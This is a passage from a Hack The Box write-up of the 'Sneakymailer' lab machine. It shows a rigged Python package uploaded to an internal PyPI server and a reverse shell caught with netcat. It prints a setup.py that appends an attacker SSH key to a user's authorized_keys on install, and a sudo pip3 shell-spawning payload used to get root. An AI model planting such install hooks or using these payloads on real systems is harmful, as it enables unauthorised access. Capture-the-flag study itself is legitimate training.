</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>developer@sneakymailer:/tmp/10.10.14.24:8080<span class="nv">$ </span><span class="nb">ls
ls
</span>pypi-pkg
</pre></table></code></div></div><p>And the files are here</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>developer@sneakymailer:/tmp/10.10.14.24:8080/pypi-pkg<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
<span class="nb">ls</span> <span class="nt">-a</span>
<span class="nb">.</span>  ..  .pypirc  setup.py
</pre></table></code></div></div><h2 id="executing-the-package">Executing the package</h2><blockquote><p>Setting the path to current dir</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>developer@sneakymailer:/tmp/10.10.14.24:8080/pypi-pkg<span class="nv">$ HOME</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
</pre></table></code></div></div><blockquote><p>Running setup.py</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>developer@sneakymailer:~<span class="nv">$ </span>python3 setup.py sdist register <span class="nt">-r</span> <span class="nb">local </span>upload <span class="nt">-r</span> <span class="nb">local</span>
&lt;n3 setup.py sdist register <span class="nt">-r</span> <span class="nb">local </span>upload <span class="nt">-r</span> <span class="nb">local
</span>running sdist
running egg_info
creating sample.egg-info
writing sample.egg-info/PKG-INFO
writing dependency_links to sample.egg-info/dependency_links.txt
writing requirements to sample.egg-info/requires.txt
writing top-level names to sample.egg-info/top_level.txt
writing manifest file <span class="s1">'sample.egg-info/SOURCES.txt'</span>
reading manifest file <span class="s1">'sample.egg-info/SOURCES.txt'</span>
writing manifest file <span class="s1">'sample.egg-info/SOURCES.txt'</span>
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating sample-1.2.0
creating sample-1.2.0/sample.egg-info
copying files to sample-1.2.0...
copying setup.py -&gt; sample-1.2.0
copying sample.egg-info/PKG-INFO -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/SOURCES.txt -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/dependency_links.txt -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/requires.txt -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/top_level.txt -&gt; sample-1.2.0/sample.egg-info
Writing sample-1.2.0/setup.cfg
creating dist
Creating <span class="nb">tar </span>archive
removing <span class="s1">'sample-1.2.0'</span> <span class="o">(</span>and everything under it<span class="o">)</span>
running register
Registering sample to http://pypi.sneakycorp.htb:8080
Server response <span class="o">(</span>200<span class="o">)</span>: OK
WARNING: Registering is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
running upload
Submitting dist/sample-1.2.0.tar.gz to http://pypi.sneakycorp.htb:8080
Server response <span class="o">(</span>200<span class="o">)</span>: OK
WARNING: Uploading via this <span class="nb">command </span>is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
</pre></table></code></div></div><h1 id="shell-as-low">shell as low</h1><p>And on the other hand on our <code class="language-plaintext highlighter-rouge">netcat</code> listener i got the shell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>➜  sneakymailer rlwrap nc <span class="nt">-nlvp</span> 2345                                   
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:45674.
python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
low@sneakymailer:/<span class="nv">$ </span><span class="nb">whoami
whoami
</span>low
</pre></table></code></div></div><h2 id="by-adding-public-key-to-authorized_keys">By adding public key to authorized_keys</h2><p>I can directly get the ssh shell by just adding my <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> of the user low</p><p>Then the setup.py will lokks like this</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">setuptools</span>

<span class="k">try</span><span class="p">:</span>
       <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/home/low/.ssh/authorized_keys"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
               <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSy9Vzqsjc9txg3ZrE6t1X124CBIvaHFjHY4WpKVR259PeTuy0+EcJcxy9iysmp97LZcvGJt7+kUlOdwD0HQBm7MiiNVK2fogqmuBS0ua5kY46V8k+Ga6rfQuD3BOsSL19yJmqh7D+A4iCCnUG+nGOJE3mMVYeA4ygwt60tBVp8kgwLbOKuXpLC82D7fU+tgUMcZZ3Syp53WJGAxP4XI9EwRqTjihZaG8iSMtN9NQPnqSiKVc22TexT+z9PEzhsXGa2MdrY1MmK3nQfu4wFUvoS3Ojoz790gL0V+GALQMVK06YfCSAFq41e743prrzZXnj+vpUFWQy0L1EMwKPF40pQX4Zx1wayADl6GHliTYwknEup+zAI7OsaXDW6lJspvCe8MGhpsdl9AGJ3dj46e97/rJZrAXjnzxj4G6QqTl0Njh8aMSvfGC4/MkTMogAb7D2Z58DWdcGIOqZqbpTI2DZAK+qVutm4CI97lvrziaISDirFHObh7T82Ck0Cn0uQsE= root@0xPrashant"</span><span class="p">)</span>
                <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
       <span class="k">pass</span>
<span class="n">setuptools</span><span class="p">.</span><span class="n">setup</span><span class="p">(</span>
        <span class="n">name</span><span class="o">=</span><span class="s">'sample'</span><span class="p">,</span>
        <span class="n">version</span><span class="o">=</span><span class="s">'1.2.0'</span><span class="p">,</span>
        <span class="n">description</span><span class="o">=</span><span class="s">'A sample Python project'</span><span class="p">,</span>
        <span class="n">long_description</span><span class="o">=</span><span class="s">"long_description"</span><span class="p">,</span>
        <span class="n">long_description_content_type</span><span class="o">=</span><span class="s">'text/x-rst'</span><span class="p">,</span>
        <span class="n">url</span><span class="o">=</span><span class="s">'https://github.com/pypa/sampleproject'</span><span class="p">,</span>
        <span class="n">author</span><span class="o">=</span><span class="s">'A. Random Developer'</span><span class="p">,</span>
        <span class="n">author_email</span><span class="o">=</span><span class="s">'author@example.com'</span><span class="p">,</span>
        <span class="n">license</span><span class="o">=</span><span class="s">'MIT'</span><span class="p">,</span>
        <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="p">.</span><span class="n">find_packages</span><span class="p">(),</span>
        <span class="n">install_requires</span><span class="o">=</span><span class="p">[</span><span class="s">'peppercorn'</span><span class="p">],</span>
<span class="p">)</span>
</pre></table></code></div></div><p>And after installing the pkg i can login with my <code class="language-plaintext highlighter-rouge">id_rsa</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>➜  prashant ssh <span class="nt">-i</span> /root/.ssh/id_rsa low@10.10.10.197
Linux sneakymailer 4.19.0-9-amd64 <span class="c">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105
low@sneakymailer:~<span class="err">$</span>
</pre></table></code></div></div><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>low@sneakymailer:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
a5b----------------------------a9
</pre></table></code></div></div><h1 id="privilege-escalation">Privilege escalation</h1><p>The user low can run the following command with sudo without passwd</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>low@sneakymailer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span>: unable to resolve host sneakymailer: Temporary failure <span class="k">in </span>name resolution
Matching Defaults entries <span class="k">for </span>low on sneakymailer:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User low may run the following commands on sneakymailer:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/pip3
</pre></table></code></div></div><p>i look for the possible way to abuse the <code class="language-plaintext highlighter-rouge">pip3</code> , i got it from <code class="language-plaintext highlighter-rouge">gtfobins</code></p><blockquote><p><a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank">https://gtfobins.github.io/gtfobins/pip/</a></p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">TF</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">mktemp</span> <span class="o">-</span><span class="n">d</span><span class="p">)</span>
<span class="n">echo</span> <span class="s">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')"</span> <span class="o">&gt;</span> <span class="err">$</span><span class="n">TF</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span>
<span class="n">pip</span> <span class="n">install</span> <span class="err">$</span><span class="n">TF</span>
</pre></table></code></div></div><p>Its something like this…</p><h2 id="abusing-pip3">Abusing pip3</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>low@sneakymailer:~<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
low@sneakymailer:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">')"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/setup.py
low@sneakymailer:~<span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install</span> <span class="nv">$TF</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>low@sneakymailer:~<span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install</span> <span class="nv">$TF</span>
<span class="nb">sudo</span>: unable to resolve host sneakymailer: Temporary failure <span class="k">in </span>name resolution
Processing /tmp/tmp.tQid5dJuNf
<span class="c"># bash</span>
root@sneakymailer:/tmp/pip-req-build-9k8kjhct# <span class="nb">whoami
</span>root
</pre></table></code></div></div><p>And we are root!!!</p><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@sneakymailer:~# <span class="nb">cat </span>root.txt
11----------------------------ff
root@sneakymailer:~#
</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Details<tbody><tr><td>email-extractor<td><a href="https://github.com/jetmore/swaks" target="_blank">https://github.com/jetmore/swaks</a><tr><td>pentest-monkey shell<td><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a><tr><td>Setting up package<td><a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank">https://pypi.org/project/pypiserver/#upload-with-setuptools</a><tr><td>setting up package<td><a href="https://packaging.python.org/tutorials/packaging-projects/" target="_blank">https://packaging.python.org/tutorials/packaging-projects/</a><tr><td>setting up package<td><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/" target="_blank">https://packaging.python.org/guides/distributing-packages-using-setuptools/</a><tr><td>Pip-gtfobins<td><a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank">https://gtfobins.github.io/gtfobins/pip/</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/active/'>active</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/phishing/" class="post-tag no-text-decoration" >phishing</a> <a href="/tags/swaks/" class="post-tag no-text-decoration" >swaks</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/imap/" class="post-tag no-text-decoration" >imap</a> <a href="/tags/pypi-server/" class="post-tag no-text-decoration" >pypi-server</a> <a href="/tags/pip-priv-esc/" class="post-tag no-text-decoration" >pip priv esc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Sneakymailer writeup - 0xPrashant&url=http://localhost:4000/posts/htb-sneakymailer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Sneakymailer writeup - 0xPrashant&u=http://localhost:4000/posts/htb-sneakymailer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Sneakymailer writeup - 0xPrashant&url=http://localhost:4000/posts/htb-sneakymailer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-servmon/"><div class="card-body"> <span class="timeago small" > Apr 13 <i class="unloaded">2020-04-13T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Servmon writeup</h3><div class="text-muted small"><p> Information Column Details Name Servmon IP 10.10.10.184 Points 20 Os Windows ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-akerva/"><div class="card-body"> <span class="timeago small" > Jun 12 <i class="unloaded">2020-06-12T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Fortress Akerva writeup</h3><div class="text-muted small"><p> Introduction@Akerva:~$ Column Details Name Akerva IP 10.13.37.11 Category Fortress Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-buff/"><div class="card-body"> <span class="timeago small" > Jul 29 <i class="unloaded">2020-07-29T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Buff writeup</h3><div class="text-muted small"><p> Introduction@Buff:~$ Column Details Name Buff IP 10.10.10.198 Points 20 Os Window...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-tabby/" class="btn btn-outline-primary"><p>Hackthebox Tabby writeup</p></a> <a href="/posts/htb-buff/" class="btn btn-outline-primary"><p>Hackthebox Buff writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-sneakymailer/'; this.page.identifier = '/posts/htb-sneakymailer/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
